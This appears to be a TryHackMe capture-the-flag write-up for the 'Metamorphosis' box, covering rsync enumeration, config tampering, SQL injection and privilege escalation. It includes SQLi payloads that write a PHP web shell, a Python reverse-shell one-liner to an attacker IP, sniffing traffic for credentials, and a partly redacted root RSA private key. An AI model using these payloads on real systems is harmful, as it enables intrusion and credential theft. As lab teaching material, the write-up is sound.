# Metamorphosis

![image](https://user-images.githubusercontent.com/5285547/126398152-edb99e4d-972a-4849-bd58-a604b7a9fa07.png)

Room link: https://tryhackme.com/room/metamorphosis

## Box name

```
sudo nano /etc/hosts
10.10.10.10 incognito.thm
```


## Nmap 

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
873/tcp open  rsync       (protocol version 31)
```

## Rsync Enum, Port 873

rsync is a utility for efficiently transferring and synchronizing files between a computer and an external hard drive and across networked computers by comparing the modification timesand sizes of files.[3] It is commonly found on Unix-like operating systems. The rsync algorithm is a type of delta encoding, and is used for minimizing network usage. Zlib may be used for additional data compression,[3] and SSH or stunnel can be used for security.

```
nc -vn 10.10.177.2 873
(UNKNOWN) [10.10.177.2] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
#list                <--- Then you ask the sever to list
Conf            All Confs <--- The server starts enumerating
@RSYNCD: EXIT         <--- Sever closes the connection
```

or

```
nmap -sV --script "rsync-list-modules" -p 873 10.10.177.2 

PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
| rsync-list-modules: 
|_  Conf                All Confs
```

List share's

```
rsync -av --list-only rsync://10.10.55.140/Conf 

receiving incremental file list
drwxrwxrwx          4,096 2021/04/10 21:03:08 .
-rw-r--r--          4,620 2021/04/09 21:01:22 access.conf
-rw-r--r--          1,341 2021/04/09 20:56:12 bluezone.ini
-rw-r--r--          2,969 2021/04/09 21:02:24 debconf.conf
-rw-r--r--            332 2021/04/09 21:01:38 ldap.conf
-rw-r--r--         94,404 2021/04/09 21:21:57 lvm.conf
-rw-r--r--          9,005 2021/04/09 20:58:40 mysql.ini
-rw-r--r--         70,207 2021/04/09 20:56:56 php.ini
-rw-r--r--            320 2021/04/09 21:03:16 ports.conf
-rw-r--r--            589 2021/04/09 21:01:07 resolv.conf
-rw-r--r--             29 2021/04/09 21:02:56 screen-cleanup.conf
-rw-r--r--          9,542 2021/04/09 21:00:59 smb.conf
-rw-rw-r--             72 2021/04/10 21:03:06 webapp.ini
```

Copy files

```
rsync -av  "rsync://10.10.55.140/Conf" . 

receiving incremental file list
./
access.conf
bluezone.ini
debconf.conf
ldap.conf
lvm.conf
mysql.ini
php.ini
ports.conf
resolv.conf
screen-cleanup.conf
smb.conf
webapp.ini

sent 255 bytes  received 194,360 bytes  389,230.00 bytes/sec
total size is 193,430  speedup is 0.99
```

Post files

```
rsync -av testfile.txt rsync://tom@10.10.55.140/Conf

sending incremental file list

sent 63 bytes  received 12 bytes  150.00 bytes/sec
total size is 7  speedup is 0.09
```

## User

Enumerating the webapp we find an endpoint with a 403 error at "http://IP/admin"

Source of the page: 
![image](https://user-images.githubusercontent.com/5285547/126498508-48557d98-3417-4269-a37e-0b1f5acec53b.png)

In webapp.ini we can see a user and password for "tom".  
Change the "prod" to "dev" to bypass the 403 error.

![image](https://user-images.githubusercontent.com/5285547/126405026-04e2a3da-4ff9-4b78-914a-91ed43b0979d.png)

Then reupload the files

```
rsync -av ./ rsync://tom@10.10.55.140/Conf 
```

Now we can access the admin portal

![image](https://user-images.githubusercontent.com/5285547/126405143-f5546a02-32e0-4712-9aaf-a65b7d5f052c.png)

Playing with the application and testing a few things out.  
I found it vunerable to Sqli


payloads
```
tom" and 2=2 and ""="
tom" union select 1,2,3-- -
tom" UNION SELECT 1,"<?php echo shell_exec($_GET['cmd']);?>",2 INTO OUTFILE "/var/www/html/shell.php" -- '
```

*Extra info
![image](https://user-images.githubusercontent.com/5285547/126409027-7d78bfa0-1586-4489-b4e3-811ac3dc081f.png)  
Credits: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-write-a-shell

### Webshell 

http://IP/admin/shell.php

![image](https://user-images.githubusercontent.com/5285547/126406971-d222658d-3caf-46d1-98aa-f81644412ab5.png)
![image](https://user-images.githubusercontent.com/5285547/126406986-7c4b4f69-2faa-48ea-a804-f8deb17ba55a.png)

Lets get a reverse shell back. 
Start a net cat listner

```
nc -lnvp 9999
```

```
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.8.153.120",9999));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```
![image](https://user-images.githubusercontent.com/5285547/126407229-c24fc6c5-30d3-43ff-b245-d8f76db7e69d.png)

Upgrade your terminal

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
stty raw -echo;fg
reset
xterm

export TERM=xterm;export SHELL=bash
```

## Root

Running linpeas on the box didn't show much, apart from tcpdump was usable. 

![image](https://user-images.githubusercontent.com/5285547/126408059-0e4b8b9e-4342-49b4-8ca7-31bc86b2a069.png)

So I started to sniff the traffic to see what was going on

```
tcpdump -i lo -A -n | tee  tcpdump.txt
```

Then transfered it to my box after..making a coffee then I went and did a few things, then came back to  
go through the results. 

```
python3 -m http.server 8899
wget http://IP:8899/tcpdump.out
```

Using sublimetext I went over the results. 

*If you need or like sublimetext4 and don't have it
```
sudo apt-get update 
sudo apt-get install sublime-text -y
```

After going over the file, I can see an id_rsa key for a user on the box.  
Let's test and see who! 

![image](https://user-images.githubusercontent.com/5285547/126501854-3b12a4ad-e0c4-4565-90ea-f2a6d46b2621.png)

Seems it was for the root account! Time to get the last flags and own the box! 

![image](https://user-images.githubusercontent.com/5285547/126502068-edf8e946-cbe0-4261-b1c7-aa9e88219a63.png)

Thanks to https://tryhackme.com/p/cirius for the excellent box and new lessons! 


### Notes/Extras

After reading the scripts in the root directory after getting the flag, we can also call the id_rsa directly with a curl command. 

serv.py
```
from flask import Flask,request

app = Flask(__name__)

@app.route('/')
def root():
    admin = request.args.get('admin')
    if(admin=="ScadfwerDSAd_343123ds123dqwe12"):
        return """-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAyLHluXzbi43DIBFC47uRqkXTe72yPGxL+ImFwvOw8D/vd9mj
rt5SXjXSVtn6TguV2SFovrTlreUsv1CQwCSCixdMyQIWCgS/d+LfUyO3SC4FEr+k
wJ0ALG6wdjmHdRDW91JW0pG9Q+nTyv22K0a/yT91ZdlL/5cVjGKtYIob/504AdZZ
                    <Redacted>
vIpxcIRBGYsylYf6BluHXmY9U/OjSF3QTCq9hHTwDb+6EjibDGVL4bDWWU3KHaFk
GPsboZECgYAVK5KksKV2lJqjX7x1xPAuHoJEyYKiZJuw/uzAbwG2b4YxKTcTXhM6
ClH5GV7D5xijpfznQ/eZcTpr2f6mfZQ3roO+sah9v4H3LpzT8UydBU2FqILxck4v
QIaR6ed2y/NbuyJOIy7paSR+SlWT5G68FLaOmRzBqYdDOduhl061ww==
-----END RSA PRIVATE KEY-----"""
    else:
        return "Only Talking to Root User"

if __name__=='__main__':
    app.run(port=1027)
```

req.sh
```
#!/bin/sh

curl http://127.0.0.1:1027/?admin=ScadfwerDSAd_343123ds123dqwe12
```

```
curl http://127.0.0.1:1027/?admin=ScadfwerDSAd_343123ds123dqwe12

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAyLHluXzbi43DIBFC47uRqkXTe72yPGxL+ImFwvOw8D/vd9mj
rt5SXjXSVtn6TguV2SFovrTlreUsv1CQwCSCixdMyQIWCgS/d+LfUyO3SC4FEr+k
wJ0ALG6wdjmHdRDW91JW0pG9Q+nTyv22K0a/yT91ZdlL/5cVjGKtYIob/504AdZZ
5NyCGq8t7ZUKhx0+TuKKcr2dDfL6rC5GBAnDkMxqo6tjkUH9nlFK7E9is0u1F3Zx
qrgn6PwOLDHeLgrQUok8NUwxDYxRM5zXT+I1Lr7/fGy/50ASvyDxZyjDuHbB7s14
                        <Redacted>
GPsboZECgYAVK5KksKV2lJqjX7x1xPAuHoJEyYKiZJuw/uzAbwG2b4YxKTcTXhM6
ClH5GV7D5xijpfznQ/eZcTpr2f6mfZQ3roO+sah9v4H3LpzT8UydBU2FqILxck4v
QIaR6ed2y/NbuyJOIy7paSR+SlWT5G68FLaOmRzBqYdDOduhl061ww==
-----END RSA PRIVATE KEY-----
```



